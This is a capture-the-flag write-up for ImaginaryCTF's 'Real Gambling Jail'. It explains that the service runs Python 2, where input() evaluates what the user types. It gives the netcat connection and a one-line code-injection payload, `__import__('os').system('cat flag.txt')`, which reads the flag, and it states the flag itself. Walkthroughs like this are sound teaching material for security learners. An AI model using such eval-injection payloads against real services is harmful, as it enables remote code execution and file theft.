# Real Gambling Jail — ImaginaryCTF Writeup

**Challenge:** Real Gambling Jail  
**Category:** Misc  
**Difficulty:** Easy  
**Points:** 50 pts  
**Flag:** `ictf{crazy_that_python_3.13_would_allow_that}`

---

## Description

> Moai man seemed to have some trouble making a proper gambling jail, so I had to lend a helping hand.

**Connection:** `nc 155.248.210.243 42489`

---

## Background Knowledge (Read This First!)

### What is the Vulnerability?

The Docker image for this challenge claims to run **Python 3.13**, but it is actually running **Python 2.7**! This is the critical bug.

### What is `input()` in Python 2 vs Python 3?

- **Python 3:** `input()` reads a string safely — no code execution
- **Python 2:** `input()` calls `eval()` on whatever you type — it executes arbitrary Python code!

This is a massive security vulnerability in Python 2 that was removed in Python 3.

### The Exploit

Since Python 2's `input()` evaluates your input, you can type any Python expression and it will be executed — including reading the flag file!

---

## Solution

### Step 1 — Connect to the server

```
┌──(zham㉿kali)-[/media/sf_downloads]
└─$ nc 155.248.210.243 42489
# → Server prompts for input (like a betting amount)
```

### Step 2 — Send the RCE payload

When prompted for input, type:

```python
__import__('os').system('cat flag.txt')
```

### Step 3 — Read the flag

The server evaluates your input, runs `cat flag.txt`, and prints:

```
ictf{crazy_that_python_3.13_would_allow_that}
```

---

## Tools Used

| Tool | Purpose | Level |
|------|---------|-------|
| `nc` | Connect and send the Python 2 eval payload | ⭐ Easy |

---

## Key Takeaways

- Python 2's `input()` runs `eval()` — a critical vulnerability removed in Python 3
- Always check which Python version is actually running — Docker image labels can lie!
- `__import__('os').system('cat flag.txt')` is the standard Python 2 `input()` RCE payload
- The flag jokes that Python 3.13 would allow it — it wouldn't, only Python 2 does
